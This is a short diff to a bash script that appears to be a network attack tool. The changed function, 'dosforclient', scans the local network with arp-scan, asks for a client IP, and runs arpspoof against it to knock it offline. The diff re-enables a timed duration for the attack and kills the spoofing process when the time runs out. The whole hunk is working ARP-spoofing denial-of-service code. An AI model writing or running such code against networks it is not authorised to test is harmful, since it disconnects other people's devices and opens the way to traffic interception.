@@ -468,12 +468,12 @@ dosforclient () {
 	reconnect; clear
 	sleep 1; sudo arp-scan -I $(echo "$tar" | sed 's/mon$//') --localnet 2>/dev/null
 	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
-	#echo -ne "\n${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
+	echo -ne "\n${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
 	tput civis
 	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\+\)$/1/g')
 	xterm -hold -e "sudo arpspoof -i "$(echo "$tar" | sed 's/mon$//')" -t "$clientattackdos" "$ipnew"" &
-	#arpspoof_PID=$!
-	#sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
+	arpspoof_PID=$!
+	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
 	modeagain
 }
 
